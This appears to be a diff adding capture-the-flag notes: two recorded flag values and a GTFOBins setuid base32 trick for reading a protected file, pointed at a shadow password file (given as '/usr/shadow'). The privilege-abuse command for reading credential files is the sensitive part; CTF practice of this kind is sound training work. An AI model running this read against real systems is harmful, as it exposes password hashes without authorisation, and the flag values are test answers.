@@ -1,0 +1,7 @@
+1 -> flag1{28327a4964cb391d74111a185a5047ad}
+root -> root{63a9f0ea7bb98050796b649e85481845!!
+
+//setuid base32 from GTFObins
+
+LFILE=/usr/shadow
+base32 "$LFILE" | base32 --decode
